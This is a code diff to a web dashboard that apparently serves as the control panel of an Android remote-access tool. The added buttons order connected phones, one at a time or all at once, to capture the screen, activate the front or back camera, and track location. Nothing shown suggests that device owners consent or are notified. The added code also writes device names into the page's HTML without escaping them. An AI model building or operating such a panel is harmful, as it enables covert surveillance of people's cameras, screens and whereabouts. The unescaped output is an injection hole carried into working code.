@@ -71,6 +71,47 @@
         </div>
     </div>
     
+    <!-- Remote Control Panel -->
+    <div class="card" style="background-color: #f8f9fa; border: 2px solid #007bff;">
+        <h2 style="color: #007bff;">🎮 Remote Control Panel</h2>
+        <p style="margin-bottom: 15px;">Control connected Android devices remotely:</p>
+        
+        <div style="display: grid; grid-template-columns: repeat(auto-fit, minmax(200px, 1fr)); gap: 15px; margin-bottom: 15px;">
+            <!-- Screen Capture Controls -->
+            <div style="border: 1px solid #ddd; padding: 10px; border-radius: 5px;">
+                <h4 style="margin-top: 0; color: #495057;">📱 Screen Capture</h4>
+                <button onclick="remoteStartScreenCapture()" style="width: 100%; margin-bottom: 5px; padding: 8px; background: #28a745; color: white; border: none; border-radius: 3px; cursor: pointer;">Start Screen Capture</button>
+                <button onclick="remoteStopScreenCapture()" style="width: 100%; padding: 8px; background: #dc3545; color: white; border: none; border-radius: 3px; cursor: pointer;">Stop Screen Capture</button>
+            </div>
+            
+            <!-- Camera Controls -->
+            <div style="border: 1px solid #ddd; padding: 10px; border-radius: 5px;">
+                <h4 style="margin-top: 0; color: #495057;">📷 Camera</h4>
+                <button onclick="remoteStartCamera('back')" style="width: 100%; margin-bottom: 5px; padding: 8px; background: #007bff; color: white; border: none; border-radius: 3px; cursor: pointer;">Start Back Camera</button>
+                <button onclick="remoteStartCamera('front')" style="width: 100%; margin-bottom: 5px; padding: 8px; background: #17a2b8; color: white; border: none; border-radius: 3px; cursor: pointer;">Start Front Camera</button>
+                <button onclick="remoteSwitchCamera()" style="width: 100%; margin-bottom: 5px; padding: 8px; background: #ffc107; color: black; border: none; border-radius: 3px; cursor: pointer;">Switch Camera</button>
+                <button onclick="remoteStopCamera()" style="width: 100%; padding: 8px; background: #dc3545; color: white; border: none; border-radius: 3px; cursor: pointer;">Stop Camera</button>
+            </div>
+            
+            <!-- Location Controls -->
+            <div style="border: 1px solid #ddd; padding: 10px; border-radius: 5px;">
+                <h4 style="margin-top: 0; color: #495057;">📍 Location</h4>
+                <button onclick="remoteStartLocation()" style="width: 100%; margin-bottom: 5px; padding: 8px; background: #28a745; color: white; border: none; border-radius: 3px; cursor: pointer;">Start Location</button>
+                <button onclick="remoteStopLocation()" style="width: 100%; padding: 8px; background: #dc3545; color: white; border: none; border-radius: 3px; cursor: pointer;">Stop Location</button>
+            </div>
+        </div>
+        
+        <!-- Device Selection -->
+        <div style="margin-top: 15px;">
+            <label for="target-device" style="font-weight: bold;">Target Device:</label>
+            <select id="target-device" style="margin-left: 10px; padding: 5px; border-radius: 3px; border: 1px solid #ddd;">
+                <option value="">All Connected Devices</option>
+            </select>
+        </div>
+        
+        <div id="remote-status" style="margin-top: 10px; padding: 8px; background: #e9ecef; border-radius: 3px; font-size: 0.9em;">Ready to send remote commands</div>
+    </div>
+    
     <div class="container">
         <div class="card">
             <h2>Screen Sharing</h2>
@@ -283,6 +324,110 @@
         document.addEventListener('DOMContentLoaded', function() {
             document.getElementById('map').innerHTML = '<div style="padding: 20px; text-align: center;">Location data will be displayed as text below.</div>';
         });
+        
+        // ===== REMOTE CONTROL FUNCTIONS =====
+        
+        function getTargetDevice() {
+            const select = document.getElementById('target-device');
+            return select.value || null;
+        }
+        
+        function updateRemoteStatus(message, success = true) {
+            const statusDiv = document.getElementById('remote-status');
+            statusDiv.textContent = message;
+            statusDiv.style.backgroundColor = success ? '#d4edda' : '#f8d7da';
+            statusDiv.style.color = success ? '#155724' : '#721c24';
+            
+            // Reset after 3 seconds
+            setTimeout(() => {
+                statusDiv.textContent = 'Ready to send remote commands';
+                statusDiv.style.backgroundColor = '#e9ecef';
+                statusDiv.style.color = 'inherit';
+            }, 3000);
+        }
+        
+        // Screen Capture Remote Control
+        function remoteStartScreenCapture() {
+            const targetDevice = getTargetDevice();
+            socket.emit('remote-start-screen-capture', targetDevice);
+            updateRemoteStatus(`Screen capture started${targetDevice ? ' for selected device' : ' for all devices'}`);
+        }
+        
+        function remoteStopScreenCapture() {
+            const targetDevice = getTargetDevice();
+            socket.emit('remote-stop-screen-capture', targetDevice);
+            updateRemoteStatus(`Screen capture stopped${targetDevice ? ' for selected device' : ' for all devices'}`);
+        }
+        
+        // Camera Remote Control
+        function remoteStartCamera(cameraType) {
+            const targetDevice = getTargetDevice();
+            socket.emit('remote-start-camera', {
+                targetDeviceId: targetDevice,
+                camera: cameraType
+            });
+            updateRemoteStatus(`${cameraType} camera started${targetDevice ? ' for selected device' : ' for all devices'}`);
+        }
+        
+        function remoteStopCamera() {
+            const targetDevice = getTargetDevice();
+            socket.emit('remote-stop-camera', targetDevice);
+            updateRemoteStatus(`Camera stopped${targetDevice ? ' for selected device' : ' for all devices'}`);
+        }
+        
+        function remoteSwitchCamera() {
+            const targetDevice = getTargetDevice();
+            socket.emit('remote-switch-camera', targetDevice);
+            updateRemoteStatus(`Camera switched${targetDevice ? ' for selected device' : ' for all devices'}`);
+        }
+        
+        // Location Remote Control
+        function remoteStartLocation() {
+            const targetDevice = getTargetDevice();
+            socket.emit('remote-start-location', targetDevice);
+            updateRemoteStatus(`Location tracking started${targetDevice ? ' for selected device' : ' for all devices'}`);
+        }
+        
+        function remoteStopLocation() {
+            const targetDevice = getTargetDevice();
+            socket.emit('remote-stop-location', targetDevice);
+            updateRemoteStatus(`Location tracking stopped${targetDevice ? ' for selected device' : ' for all devices'}`);
+        }
+        
+        // Update device selection dropdown when devices list changes
+        function updateDevicesList(devices) {
+            if (devices.length === 0) {
+                devicesList.innerHTML = '<p>No devices connected</p>';
+                
+                // Clear device selection dropdown
+                const select = document.getElementById('target-device');
+                select.innerHTML = '<option value="">All Connected Devices</option>';
+                return;
+            }
+            
+            let html = '';
+            devices.forEach(device => {
+                const connectedTime = new Date(device.connectedAt).toLocaleString();
+                html += `
+                    <div style="border: 1px solid #ddd; padding: 10px; margin: 5px 0; border-radius: 4px;">
+                        <strong>${device.deviceName || 'Unknown Device'}</strong> (${device.manufacturer || 'Unknown'})<br>
+                        <small>IP: ${device.ip} | Android ${device.androidVersion} | Connected: ${connectedTime}</small><br>
+                        <small>Socket ID: ${device.id.substring(0, 8)}...</small>
+                    </div>
+                `;
+            });
+            devicesList.innerHTML = html;
+            
+            // Update device selection dropdown
+            const select = document.getElementById('target-device');
+            let options = '<option value="">All Connected Devices</option>';
+            devices.forEach(device => {
+                const deviceName = device.deviceName || 'Unknown Device';
+                const deviceId = device.id;
+                options += `<option value="${deviceId}">${deviceName} (${device.ip})</option>`;
+            });
+            select.innerHTML = options;
+        }
     </script>
 </body>
 </html>
